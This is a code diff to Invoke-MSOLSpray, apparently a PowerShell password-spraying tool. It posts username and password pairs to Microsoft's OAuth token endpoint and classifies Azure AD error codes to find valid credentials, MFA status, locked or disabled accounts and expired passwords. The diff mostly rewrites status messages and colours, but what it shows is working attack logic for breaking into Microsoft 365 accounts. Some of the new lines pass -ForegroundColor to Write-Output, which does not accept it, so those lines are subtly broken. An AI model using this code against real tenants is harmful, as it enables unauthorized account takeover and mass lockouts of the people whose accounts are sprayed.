@@ -113,9 +113,9 @@ function Invoke-MSOLSpray{
         }
 		$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -UserAgent $UserAgent -ErrorVariable RespErr 
 
-        # If we get a 200 response code it's a valid cred
+       # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
-        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
+        Write-Host -ForegroundColor "green" "[+] $username : $password"
             $webrequest = ""
             $fullresults += "$username : $password"
         }
@@ -127,7 +127,7 @@ function Invoke-MSOLSpray{
                 # Standard invalid password
             If($RespErr -match "AADSTS50126")
                 {
-				Write-Output "[*] WARNING! Valid user, but invalid password $username : $password"
+				Write-Output "[*] Valid user, but invalid password $username : $password"
                 $fullresults += "Valid user, but invalid password : $username"
 				#continue
                 }
@@ -135,57 +135,57 @@ function Invoke-MSOLSpray{
                 # Invalid Tenant Response
             ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                 {
-                Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
+                Write-Output -ForegroundColor "yellow" "[-] Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                 }
 
                 # Invalid Username
             ElseIf($RespErr -match "AADSTS50034")
                 {
-                 Write-Output "[*] WARNING! The user $username doesn't exist."
+                 Write-Output -ForegroundColor "yellow" "[-] $username doesn't exist. Invalid Username."
                 }
 
                 # Microsoft MFA response
             ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                 $fullresults += "$username : $password"
                 }
     
                 # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
             ElseIf($RespErr -match "AADSTS50158")
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                 $fullresults += "$username : $password"
                 }
 
                 # Locked out account or Smart Lockout in place
             ElseIf($RespErr -match "AADSTS50053")
                 {
-                Write-Output "[*] WARNING! The account $username appears to be locked."
+                Write-Output -ForegroundColor "yellow" "[-] The account $username appears to be locked."
                 $lockout_count++
                 }
 
                 # Disabled account
             ElseIf($RespErr -match "AADSTS50057")
                 {
-                Write-Output "[*] WARNING! The account $username appears to be disabled."
+                Write-Output -ForegroundColor "yellow" "[-] The account $username appears to be disabled."
                 }
             
                 # User password is expired
             ElseIf($RespErr -match "AADSTS50055")
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The user's password is expired."
                 $fullresults += "$username : $password"
                 }
 			ElseIf(($RespErr -match "AADSTS53003")-or ($RespErr -match "AADSTS53000"))
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                Write-Host -ForegroundColor "green" "[+]  $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
                 $fullresults += "$username : $password"
                 }
                 # Unknown errors
             Else
                 {
-                Write-Output "[*] Got an error we haven't seen yet for user $username = $RespErr"
+                Write-Output -ForegroundColor "red" "[!] Got an error we haven't seen yet for user $username = $RespErr"
                 $RespErr
                 }
         }
